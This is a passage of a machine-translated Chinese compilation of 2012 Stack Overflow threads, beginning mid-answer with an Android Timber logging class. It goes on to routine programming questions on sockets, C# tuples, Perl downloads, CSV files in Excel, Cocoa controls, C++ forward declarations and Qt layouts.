class MyLinkingTimberTree : Timber.DebugTree() {
    override fun createStackElementTag(element: StackTraceElement): String? {
        return makeClickableLineNumber(element)
    }

    private fun makeClickableLineNumber(
        element: StackTraceElement
    ): String {
        val className = element.fileName
        val methodName = element.methodName
        val lineNumber = element.lineNumber
        val fileName = element.fileName
        val stringBuilder = StringBuilder(className)
        .append(".")
        .append(methodName)
        .append(" (")
        .append(fileName)
        .append(":")
        .append(lineNumber)
        .append(")  ")
        return stringBuilder.toString()
    }
} 
```

然后像这样实例化它：

```
class MyApplication: Application() {

    override fun onCreate() {
        super.onCreate()
        if(BuildConfig.DEBUG) {
            Timber.plant(MyLinkingTimberTree())
        }
    }
} 
```

然后正常使用 Timber：

```
Timber.d("Currently Signed in:") 
```

这就是结果。不错，不是吗？我希望你喜欢使用它，就像我喜欢制作它一样！;)

[![带logcat的链接！](../Images/44d3071c197d75a0841f10385cfe5acb.png)](https://i.stack.imgur.com/yf1qL.png)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T09:44:14.110

是的，你可以做到..按照[SO-logging上回答的示例进行操作](https://stackoverflow.com/a/4332163/786337)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-02-21T16:28:07.753

# 用简单的方式回答这个问题：

尊敬的 cette règle ：

```
{FileName}.{ext}:{LigneNumber}

e.g. MainActivity.java:10 
```

它给出了如下示例

```
Log.d(TAG, "onResume: MainActivity.java:10"); 
```

我希望这能帮到您

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-02-27T17:55:41.363

这并不完全是问题的答案，但也许它是一个“足够接近”的解决方法。

1.  突出显示日志文本
2.  按 CTRL-SHIFT-F
3.  双击搜索结果。

如果在按 CTRL-SHIFT-F 之前突出显示文本，则无需键入或复制/粘贴。
[![搜索结果截图](../Images/51cfb2506c48f02614bbc4db2fb3e227.png)](https://i.stack.imgur.com/uJ5B3.png)

如果您的搜索倾向于产生太多结果，您可以使用实时模板创建唯一的 logcat 条目：

创建一个实时模板以插入类、方法和行号（在撰写本文时）。我用“logi”。是的，随着您继续编写，行号将变得越来越不准确，但它仍然可以作为使您的日志条目更“可查找”的一种方式。

[![实时模板截图](../Images/20df5652d2c5145053e633b599846289.png)](https://i.stack.imgur.com/EdQyg.png)

# c++ - 损坏的 HTML - 浏览器不会从我的网络服务器下载整个 HTTP 响应，CURL 会

> ID：10597627
> 
> 赞同：2
> 
> 时间：2012-05-15T09:16:05.263
> 
> 标签：c++, http, sockets, embeddedwebserver

## 症状

我想，我搞砸了，因为 Mozilla Firefox 和 Google Chrome 都会产生相同的错误：它们没有收到网络服务器发送给它们的全部响应。CURL 永远不会错过，快速滚动响应的最后一行始终是*"</html>"*。

## 原因

原因是，我更多地发送响应：

```
 sendHeaders();  // is calls sendResponse with a fix header
    sendResponse(html_opening_part);
    for ( ...scan some data... ) {
        sendResponse(the_data);
    } // for
    sendResponse(html_closing_part) 
```

*浏览器在sendResponse()*调用之间停止接收数据。此外，网络服务器不会*关闭（）*套接字，只是在最后。

（我为什么这样做：我写的程序是为非linux系统设计的，它会在嵌入式计算机上运行。它没有太多的内存，主要被*lwIP*堆栈占用。所以，避免收集 -相对 - 巨大的网页，我分部分发送。像它这样的浏览器，没有像在 Linux 下那样发生损坏的 HTML。）

## 环境

该平台是 GNU/Linux（Ubuntu 32 位和 3.0 内核）。我的小型网络服务器将这些东西发送回客户端标准方式：

```
 int sendResponse(char* data,int length) {

        int x = send(fd,data,length,MSG_NOSIGNAL);
        if (x == -1) {
            perror("this message never printed, so there's no error \n");
            if (errno == EPIPE) return 0;
            if (errno == ECONNRESET) return 0;

            ... panic() ... (never happened) ...

        } // if send()

    } // sendResponse() 
```

这是我正在使用的固定标题：

```
 sendResponse(
        "HTTP/1.0 200 OK\n"
        "Server: MyTinyWebServer\n"
        "Content-Type: text/html; charset=UTF-8\n"
        "Cache-Control: no-store, no-cache\n"
        "Pragma: no-cache\n"
        "Connection: close\n"
        "\n"
    ); 
```

## 问题

这是正常的吗？我必须用一个*send()*发送整个响应吗？（我现在正在努力，直到一个快速的解决方案到来。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:29:53.093

如果您阅读 RFC 2616，您会发现应该使用`CR+LF`行尾。

除此之外，打开浏览器开发人员工具以查看他们正在发出的确切请求。使用像 Netcat 这样的工具来复制请求，然后依次消除每个标头，直到它开始工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T10:29:33.273

明白了！

正如@Jim 建议的那样，我尝试使用 CURL 发送相同的标头，就像 Mozilla 所做的那样：*失败*、损坏的管道等。我已经删除了一半的标头：*好的*。我已经一一补充了：*失败*。删除*了另一*半标题：*好的*......所以，只有当标题太长时才会出错。答对了。

正如我所说，嵌入式设备中的内存量非常小。所以，我没有阅读整个请求头，只有 256 个字节。我只需要 GET 参数和“Host”标头（即使我真的不需要它，只是用相同的“Host”而不是 IP 地址执行重定向）。

所以，如果我不*recv()*整个请求标头，我就不能*send()*回整个响应**。**

 *谢谢你的建议，伙计们！*

# c# - 制作我们自己的清单

> ID：10597629
> 
> 赞同：9
> 
> 时间：2012-05-15T09:16:19.093
> 
> 标签：c#, .net, list

我们可以`List<string, string, string>`在 C#.NET 中自己制作吗？我需要创建一个列表，其中包含 3 个不同的字符串作为列表中的单个元素。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-05-15T09:18:47.843

`List`您当然可以使用三个泛型类型参数创建自己的类。不过，我*强烈*建议您不要这样做。它会使任何使用您的代码的人感到困惑。

相反，*要么*使用`List<Tuple<string, string, string>>`（如果你使用的是 .NET 4，无论如何）或（最好）创建你自己的类来以有意义的方式封装这三个字符串，然后使用`List<YourNewClass>`.

创建您自己的类将在您编写和阅读代码时更加清晰 - 通过为所涉及的三个不同字符串命名，每个人都会知道它们的含义。您还可以在需要时为班级提供更多行为。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-05-15T09:19:47.210

您可以使用[元组](http://sankarsan.wordpress.com/2009/11/29/tuple-in-c-4-0/)来实现这一点。

例如：

```
var list = new List<Tuple<string,string,string>>(); 
```

迭代你*可能想做*一个简单的值：

```
 list.ForEach(x=>{
     //x is a Tuple
    }); 
```

或者要**找到**一些特定的元组，您*可能需要*执行以下操作：

```
 var list = new List<Tuple<string,string,string>>{
        new Tuple<string,string,string>("Hello", "Holla", "Ciao"),
        new Tuple<string,string,string>("Buy", "--", "Ciao")
     };

     list.Where(x=>x.Item2 == "--"); 
```

这将返回最后一个元组。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-15T09:18:31.667

您可以使用[元组](http://msdn.microsoft.com/en-us/library/system.tuple.aspx)列表。像这样：

```
List<Tuple<string, string, string>> 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-05-15T09:19:10.597

也许是这样的：

```
var ls= new List<Tuple<string,string,string>>(); 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-05-15T09:42:28.353

我推荐这个解决方案

```
 public class MyCustomClass
    {
        public string MyString1 { get; set; }
        public string MyString2 { get; set; }
        public string MyString3 { get; set; }
    }

    class MyApp
    {
        public MyApp()
        {
            List<MyCustomClass> customList = new List<MyCustomClass>();
            customList.Add(new MyCustomClass
            {
                MyString1 = "Hello",
                MyString2 = "Every",
                MyString3 = "Body",
            });
        }
    } 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-05-15T09:33:51.300

例如：

```
var list = new List<Tuple<string, string, string>>();
var tuple = Tuple.Create("a", "b", "c");
list.Add(tuple); 
```

有关更多信息，请查看[MSDN](http://msdn.microsoft.com/ru-ru/library/system.tuple.aspx)。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-05-15T09:19:26.707

制作一个怎么样`List<Tuple<string, string, string>>`？

一个更好的主意可能是，如果每个字符串都有特定的含义，则将它们全部放入一个类中，然后创建一个列表。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-05-15T09:23:41.353

不，遗憾的是这不起作用。您可以做的最好的事情是创建一个列表列表，或者利用 IDictionary 接口的某种形式的实现。

尽管如此，如果您有以这种方式属于一起的三项数据，那么创建一个包含它们的类可能是值得的。

这将使您有机会在您的应用程序周围传递一个列表，并为每个数据项分配有意义的名称。永远不要低估六个月后可读性的力量。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-05-15T09:31:33.700

您可以定义一个 List 并实现所需的接口（例如 IList）。代码爆炸。

```
public class List<T1, T2, T3> : IList
{

    #region IList Members

    public int Add(object value)
    {
        throw new NotImplementedException();
    }

    public void Clear()
    {
        throw new NotImplementedException();
    }

    public bool Contains(object value)
    {
        throw new NotImplementedException();
    }

    public int IndexOf(object value)
    {
        throw new NotImplementedException();
    }

    public void Insert(int index, object value)
    {
        throw new NotImplementedException();
    }

    public bool IsFixedSize
    {
        get { throw new NotImplementedException(); }
    }

    public bool IsReadOnly
    {
        get { throw new NotImplementedException(); }
    }

    public void Remove(object value)
    {
        throw new NotImplementedException();
    }

    public void RemoveAt(int index)
    {
        throw new NotImplementedException();
    }

    public object this[int index]
    {
        get
        {
            throw new NotImplementedException();
        }
        set
        {
            throw new NotImplementedException();
        }
    }

    #endregion

    #region ICollection Members

    public void CopyTo(Array array, int index)
    {
        throw new NotImplementedException();
    }

    public int Count
    {
        get { throw new NotImplementedException(); }
    }

    public bool IsSynchronized
    {
        get { throw new NotImplementedException(); }
    }

    public object SyncRoot
    {
        get { throw new NotImplementedException(); }
    }

    #endregion

    #region IEnumerable Members

    public IEnumerator GetEnumerator()
    {
        throw new NotImplementedException();
    }

    #endregion
} 
```

不过，`List<Tuple<string,string,string>>`推荐。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-05-15T09:33:06.183

```
public class Listt< T, T1, T2>
    {
         public Listt()
        {

        }
        public void Add(T item, T1 item1, T2 item3)
        {

        }
    }

public partial class MyApp : Window
{

 public MyApp()

 {

  InitializeComponent();

     Listt<string, string, string> customList = new Listt<string, string, string>();
     customList.Add("we","are","here");

  }
} 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2016-07-28T07:22:52.147

有人试过`dynamic`吗？

```
var list = new List<dynamic>();
list.Add(new { Name = "SampleN", Address = "SampleA", Email = "SampleE" });

var name = list[0].Name; 
```

# perl - 如何下载`decoded_content`

> ID：10597630
> 
> 赞同：0
> 
> 时间：2012-05-15T09:16:20.163
> 
> 标签：perl, download, lwp-useragent, resume-download

**********更新后的代码，具有恢复功能****** *****

 **```
 my $ua = LWP::UserAgent->new;
    $ua->credentials('$ip:80', 'Realm', 'username', 'password');
    my $response = $ua->mirror($url,$newfile);
    if ($response->is_success) {
       print "Download Successfull.";
    }
    else {
        print "Error: " . $response->status_line;
    } 
```

****** *** ** *** *****旧代码****** ** *** ** *** ** *** ** *** ** *** *****

 **```
 my $ua = LWP::UserAgent->new;
    $ua->credentials('$ip:80', 'Realm', 'username', 'password');
    my $response = $ua->get($url);
    if ($response->is_success) {
       print "Retrieved " .length($response->decoded_content) .
             " bytes of data.";
    }
    else {
        print "Error: " . $response->status_line;
    }

open my $fh, '>encoding(UTF-8)', $tmp;
print {$fh} $response->decoded_content;
close $fh;

if ( -e $tmp ) {
   my $filesize = ( stat $tmp )[9];
   my $origsize = $queue[$rec][1];

   if ( $filesize < $origsize) {
      print "Resuming download";
   ******************************************
  code for resuming the partly downloaded file...
   *******************************************
   }
   else {
      print "File downloaded correctly\n";
   }
} 
```

由于我是 perl 的新手，可以下载`decoded_content`，但仍然存在一些错误。如果我们有部分文件，需要恢复文件下载。

这是我尝试过的代码，但不知道从哪里开始，因此在这方面的任何快速想法确实会有很大帮助。请帮助解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:42:42.500

见[方法`mirror``LWP::UserAgent`](http://p3rl.org/LWP%3a%3aUserAgent#ua-mirror-url-filename-)。[_](http://p3rl.org/LWP%3a%3aUserAgent#ua-mirror-url-filename-) 文档引用：

> 此方法将获取由 $url 标识的文档并将其存储在名为 $filename 的文件中。

```
my $response = $ua->mirror($url, $filename); # no single quotes around variables! 
```

请参阅 的[源代码`mirror`](http://kobesearch.cpan.org/htdocs/libwww-perl/LWP/UserAgent.pm.html#mirror-)，它可以正确处理截断/部分下载的文件。****

# c - C/如何监听多个UDP端口

> ID：10597636
> 
> 赞同：3
> 
> 时间：2012-05-15T09:16:37.013
> 
> 标签：c, sockets

我正在处理的应用程序应该能够监听多个（现在是 4 个）端口号。我是否需要为每个端口创建一个套接字，例如：

```
if((sock_fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
    perror("error: could not create UDP socket\n");
    exit(EXIT_FAILURE);
}

bzero(&sock_addr, sizeof(sock_addr));
sock_addr.sin_family    = AF_INET;
sock_addr.sin_port      = htons(port1);
sock_addr.sin_addr.s_addr   = inet_addr(INADDR_ANY);

if(bind(sock_fd, (struct sockaddr *) &sock_addr, sock_len) < 0) {
    perror("error: could not bind UDP socket to AU\n");
    exit(EXIT_FAILURE);
} 
```

还是有更优雅的方式来做到这一点？我还阅读了该`select()`声明，那是我应该使用的吗？我想监听几个端口的原因很简单，它应该识别我正在与之通信的应用程序。例如，每个端口一个应用程序。

提前感谢您的评论。

// 更新：我应该如何为每个端口设置一个套接字？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T09:18:39.997

是的，您需要为您希望通过其进行通信的每对（IP，端口）号码使用单独的套接字。

是的，您绝对可以使用该`select()`函数（它不是一个“声明”，这意味着它以某种方式成为语言的一部分，它只是库中的一个函数），一旦您将它们全部设置好，就可以为多个套接字提供服务。

# css - 如何在 jQuery mobile 上删除图像/内容的底部填充

> ID：10597641
> 
> 赞同：1
> 
> 时间：2012-05-15T09:16:54.050
> 
> 标签：css, jquery-mobile

我不确定底部的填充（查找照片下方的红色像素）是否设置在图像或内容 div 上，但我想摆脱它。我的问题的 jsFiddle 在这里：http: [//jsfiddle.net/FERUs/](http://jsfiddle.net/FERUs/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T09:29:54.813

将 display: 块添加到您的图像 css:

```
#picture {
    max-height:100%;
    max-width:100%;
    display: block;
} 
```

更多信息[在这里](http://www.dreamincode.net/forums/topic/247615-annoying-white-space-under-an-image/)。

# asynchronous - 异步 BPEL 流程超时

> ID：10597642
> 
> 赞同：0
> 
> 时间：2012-05-15T09:16:56.453
> 
> 标签：asynchronous, timeout, bpel, apache-ode

我想创建一个非常简单的异步回显过程。因此，我创建了一个 BPEL 流程“EchoAsynch”[1]，它返回它获取的字符串。这是将由“eventHandler”[1]调用的服务。在 eventHandler 中，我通过调用将输入发送到“EchoAsynch”并等待接收带有“receive”活动的答案。问题是我永远得不到答案。BPEL 流程在 120 秒后超时。你能告诉我我做错了什么吗？

谢谢，迈克尔

PS 我在 Tomcat 服务器 (7.0.27) 上使用 Apache ODE 1.3.5 并使用 BPEL Eclipse Designer 在 Eclipse 中对其进行测试。

[1] [http://www.file-upload.net/download-4361941/processes.zip.html](http://www.file-upload.net/download-4361941/processes.zip.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T18:26:01.890

@Michael，一旦我调用了 eventHandler 进程，就会抛出一个 selectionFailure ，如下所示。

[2012-05-16 22:46:22,922] 信息 - 分配 - 分配错误：{http://docs.oasis-open.org/wsbpel/2.0/process/executable}selectionFailure,lineNo=79,faultExplanation={http ://docs.oasis-open.org/wsbpel/2.0/process/executable}selectionFailure：表达式没有结果：'tns:result'反对'<?xml version="1.0" encoding="UTF-8"?> <EchoAsynchProcessResponse xmlns="http://www.example.org/eventhandleras"><tns:result xmlns:tns="http://www.example.org/eventhandler">tns:result</tns:result> < /EchoAsynchProcessResponse>'

所以我修复了它并且它起作用了。注意 - 我在由 Apache ODE 提供支持的 WSO2 BPS 中进行了尝试。所以我认为这也应该在你的环境中工作。[请在http://www.2shared.com/file/3ATXoeFd/processes.html](http://www.2shared.com/file/3ATXoeFd/processes.html)找到我的固定样本

# python - CSV 文件创建问题

> ID：10597643
> 
> 赞同：1
> 
> 时间：2012-05-15T09:16:58.613
> 
> 标签：python, excel, file, csv

我正在使用以下行从 python 脚本创建一个 csv 文件：

```
def createFile():
    logfile = csv.writer(open('logfile.csv', 'wb'), dialect='excel')
    formater = zip(dates, hours, threadids, loglevels, errorcodes, errormessage)
    for i in formater:
        logfile.writerow(i) 
```

一切正常，直到我用 Excel 打开文件，因为它在一列中打开了整个文本。这是 csv 中的一行的样子：

```
4/29/12,22:44:32:865 EDT,0000004b,A,CHFW0019I,The Transport Channel Service has started chain chain_308. 
```

有什么方法可以打开按列拆分的文件应该如何？问候。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:21:16.723

我保存了以下内容`foo.csv`，它在 Excel 中可以正常打开。

```
4/29/12,22:44:32:865 EDT,0000004b,A,CHFW0019I,The Transport Channel Service has started chain chain_308.
4/29/12,22:44:32:865 EDT,0000004b,A,CHFW0019I,The Transport Channel Service has started chain chain_308.
4/29/12,22:44:32:865 EDT,0000004b,A,CHFW0019I,The Transport Channel Service has started chain chain_308.
4/29/12,22:44:32:865 EDT,0000004b,A,CHFW0019I,The Transport Channel Service has started chain chain_308.
4/29/12,22:44:32:865 EDT,0000004b,A,CHFW0019I,The Transport Channel Service has started chain chain_308. 
```

![在此处输入图像描述](../Images/ee5ab4f5ad80fe1f3ba1ffa92c8b1496.png)

您可能需要使用以下方法之一检查您是否在区域设置中配置了正确的列表分隔符：

1.  Windows 开始按钮 > 控制面板 > 区域和语言选项 > 区域选项 > 自定义 > 列表分隔符。
2.  Windows 开始按钮 > 控制面板 > 区域和语言选项 > 格式 > 其他设置 > 列表分隔符。

请注意，您也可以使用命令启动“区域和语言选项” `intl.cpl`，即按 Windows + R 按钮并输入`intl.cpl`并按“确定”按钮。

![在此处输入图像描述](../Images/0825851b7f6f746306786afe978565dc.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T09:38:03.170

要让 Excel 自动解析您的 .CSV 并将其拆分为列，而无需您这样做或询问，您的分隔符将需要与您可以在下面找到的区域设置分隔符匹配

`Control Panel -> Region & Language -> Additional Settings -> List Seperator`

这需要与您在 .CSV 文件中使用的列分隔符相匹配，以便 Excel 正确打开和拆分列。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-22T05:16:39.207

CSV 的第一行应该是：

```
sep=, 
```

这样，您就可以对 Excel 自动使用“，”来分隔内容。

# objective-c - 将自定义 NSControl 和 NSCell 添加到 xib

> ID：10597644
> 
> 赞同：2
> 
> 时间：2012-05-15T09:17:02.463
> 
> 标签：objective-c, macos, cocoa

我用相对的 NSCell 创建了一个非常简单的 NSControl 来进行一些测试。要在 Window 上添加此控件，我通过拖动 NSView 的“Interface Builder”添加它，然后将其类更改为`MyControl`.

这是我的代码：

**NSControl**

```
@implementation MYControl

+ (void)initialize
{
    if (self == [MYControl class])
    {
        [self setCellClass: [MYCell class]];
    }
}

- (id)initWithFrame:(NSRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {
    }

    return self;
}

- (id)initWithCoder:(NSCoder *)aDecoder
{
    self = [super initWithCoder:aDecoder];
    if (self) {
    }

    return self;
}

+(Class)cellClass{  
    return [MYCell class];
}

@end 
```

**NS细胞**

```
@implementation MYCell

-(void)drawWithFrame:(NSRect)cellFrame inView:(NSView *)controlView{  
    /*
    [[NSGraphicsContext currentContext]saveGraphicsState];
    [[NSColor redColor]set];
    [NSBezierPath fillRect:cellFrame];
    [[NSGraphicsContext currentContext]restoreGraphicsState];*/
}
@end 
```

如果我从 NSControl 类中删除对 MyCell 的所有引用，它会起作用（但显然什么也没显示），否则，启动应用程序会出现一些错误：

```
<Error>: kCGErrorFailure: CGSShapeWindow 

<Error>: kCGErrorFailure: Set a breakpoint @ CGErrorBreakpoint() to catch errors as they are logged.

_NXPlaceWindow: error setting window shape (1000)

<Error>: kCGErrorFailure: CGSShapeWindow

_NSShapeRoundedWindowWithWeighting: error setting window shape (1000) 
```

我错了什么？如何通过 XCode4/IB 正确设置自定义 NSControl？从文档中我读到了一些关于 IB Palette 的内容，但我认为我不能在 Xcode 4.0 中使用它

编辑：

使用 initWithFrame 以编程方式添加 NSControl 它可以工作

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T20:19:41.033

我相信我终于找到了答案。

-cellSize 方法必须在您的 NSCell 子类中被覆盖。经过大量堆栈跟踪后，我发现此方法将返回 (40000, 40000) 作为您的单元格大小，如果它没有被覆盖，从而产生我们看到的大小错误。由于我的 NSCell 中有特殊需要，需要单元格占据整个 NSControl 的绘图区域，所以我简单地使用了以下内容。

```
- (NSSize)cellSize {
    return self.controlView.bounds.size;
} 
```

希望这对您的情况有所帮助。

# c# - 比使用条件运算符附加空字符串更好的解决方案

> ID：10597645
> 
> 赞同：3
> 
> 时间：2012-05-15T09:17:05.540
> 
> 标签：c#, string-concatenation, conditional-operator

几乎每天我都会遇到以下形式的代码：

```
string x = "foo" + (someTest ? "bar" : ""); 
```

只有当某个值为真时，肯定有更好的方法来简洁地附加一个字符串？

这个：

```
string x = "foo";
if (someTest)
    x += "bar"; 
```

不满足我的胃口，因为我经常想直接使用字符串（例如作为函数参数），而不是将其存储在变量中。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-15T09:24:23.507

扩展方法呢？

```
string x = "foo".AppendIf(someTest, "bar");

public static string AppendIf(this string value, bool expression, string append)
{
    return expression
       ? value + append;
       : value;
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-15T09:25:01.040

为什么不编写自己的扩展方法来做到这一点？

```
public static string AppendIf(this string value, string toAppend, bool condition)
{
    return condition ? String.Format("{0}{1}", value, toAppend) : value;
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-15T09:27:07.063

使用扩展

```
public static class StringExtensions
{
    public static string AppendIf(this string s, bool condition, string append)
    {            
       return condition ? s + append : s;
    }
}

string x = "Foo";
x.AppendIf(someTest, "bar");

// or even

string y = "Foo".AppendIf(someTest, "bar"); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T09:24:54.237

假设字符串文字也可以是变量：

如果有我还没有找到。

我认为你的两个例子是最好的。

唯一的反对意见是，如果您需要使用带有 stringbuilder 的第二个解决方案而不是串联有条件地添加许多字符串，那么考虑到性能、可读性和可维护性，应该是一个更好的解决方案。

深嵌套？: 构造可能很难遵循，尤其是在有多个分叉的情况下。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-15T09:21:02.577

怎么样：

```
string x = someTest ? "foobar" : "foo"; 
```

# c++ - 声明/定义顺序依赖

> ID：10597649
> 
> 赞同：0
> 
> 时间：2012-05-15T09:17:19.693
> 
> 标签：c++, class, gcc, forward-declaration

我有这样的代码（C++）：

```
namespace models
{
    class model
    {
        private:
            ui::window* win;
    };
}

namespace ui
{
    class window
    {
        private:
            models::model* modl;
    };
} 
```

正如你所看到的那样，这是一个喧嚣的地狱。如您所知，此代码无法编译，除非我为`window`之前的模型提供前向声明，这通常是不合理的，因为上面不是完整的代码，而且代码还将扩展。

有没有系统的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:19:14.830

> 除非我在模型之前为窗口提供前向声明，否则通常这样做是不合理的

事实上，它是。您应该尽可能使用前向声明而不是包含或完整定义。

但最重要的是，您的设计至少看起来很尴尬。

编辑：根据请求，带有前向声明的代码：

```
namespace ui
{
    class window;
}
namespace models
{
    class model
    {
        private:
            ui::window* win;
    };
}

//required if this is in a different file
namespace models
{
    class model;
}
namespace ui
{
    class window
    {
        private:
            models::model* modl;
    };
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T09:33:00.537

接下来将是打破循环依赖的解决方案。[观察者模式](http://en.wikipedia.org/wiki/Observer_pattern)
会更灵活。

```
namespace models
{
    class modelUser
    {
       virtual void handleModelUpdate() = 0;
       virtual ~modelUser
    }
    class model
    {
        public:
            model(modelUser* user) : mUser(user) { }
        private:
            modelUser* mUser;
    };
}

namespace ui
{
    class window: public models::modelUser
    {
        private:
            models::model* modl;
            virtual void handleModelUpdate() { std::cout << "update from model\n"; }
    };
} 
```

# search - 实时数据流的实时索引

> ID：10597651
> 
> 赞同：0
> 
> 时间：2012-05-15T09:17:31.870
> 
> 标签：search, real-time, sphinx

比方说，我正在维护很多文档的索引。我想更新新到达数据的索引，使其尽可能实时。我需要查看什么样的索引工具？我看过 Sphinx 和 Lucene，在之前的帖子中，推荐将它们用于实时索引。

Sphinx 中使用的 delta 索引机制看起来是一个非常巧妙的想法。

我的一些问题是

1) 文档到达后多久可以搜索到？2) 索引合并过程的效率如何？（合并增量索引和主索引）

我知道这些是非常普遍的问题，我想知道使用 Sphinx 是否是解决这个问题的正确方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T10:26:22.477

Sphinx 具有[实时索引](http://sphinxsearch.com/docs/current.html#rt-indexes)，允许动态添加/更新/删除索引。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-16T02:21:48.187

您可以查看[Apache Solr (NRT)](http://wiki.apache.org/solr/NearRealtimeSearch)和[Elastic Search](http://www.elasticsearch.org/)以了解使用 Lucene 的实时实施。你可以看看一些[基准](http://engineering.socialcast.com/2011/05/realtime-search-solr-vs-elasticsearch/)。

# c# - 使用 DynDNS 和 WebRequest C# 获取公共 IP

> ID：10597655
> 
> 赞同：2
> 
> 时间：2012-05-15T09:17:40.780
> 
> 标签：c#, ip, dyndns

我使用此代码获取公共 IP 地址（感谢这篇文章[如何获取运行我的 C# 应用程序的服务器的 IP 地址？](https://stackoverflow.com/questions/1069103/how-to-get-my-own-ip-address-in-c)）：

```
 public static string GetPublicIP()
    {
        try
        {
            String direction = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            {
                using (StreamReader stream = new StreamReader(response.GetResponseStream()))
                {
                    direction = stream.ReadToEnd();
                }
            }

            //Search for the ip in the html
            int first = direction.IndexOf("Address: ") + 9;
            int last = direction.LastIndexOf("</body>");
            direction = direction.Substring(first, last - first);

            return direction;
        }
        catch (Exception ex)
        {
            return "127.0.0.1";
        }
    } 
```

但是无论谁访问我的网站，他们都获得相同的IP，并且是服务器公共IP，而不是当前用户的IP。

是否可以在当前用户的上下文中运行 WebRequest，而不是作为服务器？

还是我在 App_Code 中运行此函数以使当前用户请求不可用，而是使用服务器上下文的问题？

请帮忙！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:24:35.520

我猜这段代码是在网络服务器上运行的——你有一个页面可以让客户检查他们的 IP 地址吗？如果是这样，我怀疑你已经糊涂了。如果没有，请详细说明它在哪里运行。

如果上面的代码在服务器*上*运行，那么如果您调用远程服务器并询问“此请求来自哪个 IP 地址”，您将始终获得该服​​务器的公共 IP 地址 - 这就是您的代码示例正在做。

如果您想要呼叫您的客户端的 IP 地址 - 假设您是一个 Web 应用程序，那么您应该查看[HttpWebRequest.UserHostAddress](http://msdn.microsoft.com/en-us/library/system.web.httprequest.userhostaddress.aspx)，尽管请注意这不是万无一失的。在[这里](https://stackoverflow.com/questions/735350/how-to-get-a-users-client-ip-address-in-asp-net)查看更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:25:37.327

这应该会发生，代码正在您的机器上运行，因此您可以获得自己的 IP 地址。要从用户那里获取信息，您必须检查用户发送的标头，特别是**REMOTE_ADDR**标头。

您可能可以在代码中的某处使用**Request.ServerVariables["REMOTE_ADDR"]**。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T09:31:04.217

由于您是从服务器发出请求，因此您将获得服务器的 IP 地址。

我不确定你有什么样的服务。对于 WCF 服务，您可以从请求的 OperationContext 对象的 IncomingMessageProperties 中获取 IP 地址。在此处查看示例：[Get the Client's Address in WCF](http://www.danrigsby.com/blog/index.php/2008/05/21/get-the-clients-address-in-wcf/)

```
[ServiceContract]
public interface IMyService
{
    [OperationContract]
    string GetAddressAsString();
}

public class MyService : IMyService
{
    public string GetAddressAsString()
    {
        RemoteEndpointMessageProperty clientEndpoint =
            OperationContext.Current.IncomingMessageProperties[
            RemoteEndpointMessageProperty.Name] as RemoteEndpointMessageProperty;

        return String.Format(
            "{0}:{1}",
            clientEndpoint.Address, clientEndpoint.Port);
    }
} 
```

# c++ - 布局在 Qt 中不起作用

> ID：10597657
> 
> 赞同：2
> 
> 时间：2012-05-15T09:17:44.117
> 
> 标签：c++, qt, layout, button

我在 Qt 中的布局有问题。我正在尝试使用 2 个水平布局和一个垂直主布局来编译此代码。每个水平布局都有 3 个按钮，两个水平布局都包含在垂直布局中。但是在我编译这段代码之后，我只能看到一个只有“退出”按钮的小窗口。

```
firstline = new QHBoxLayout(this);
secondline = new QHBoxLayout(this);

layout = new QVBoxLayout(this);

eat = new QPushButton("Eat", this);
drink = new QPushButton("Drink", this);
smoke = new QPushButton("Smoke", this);

save = new QPushButton("Save", this);
load = new QPushButton("Load", this);
exit = new QPushButton("Exit", this);

firstline->addWidget(eat);
firstline->addWidget(drink);
firstline->addWidget(smoke);

secondline->addWidget(save);
secondline->addWidget(load);
secondline->addWidget(exit);

layout->addLayout(firstline);
layout->addLayout(secondline);

setLayout(layout); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:38:57.820

您已经通过这些语句设置对话框的布局...

```
 firstline = new QHBoxLayout(this);
 secondline = new QHBoxLayout(this); 
```

所以调用它们的构造函数而不指定它们的父窗口小部件。

```
firstline = new QHBoxLayout();
secondline = new QHBoxLayout(); 
```

这将按照您的预期显示您的布局。

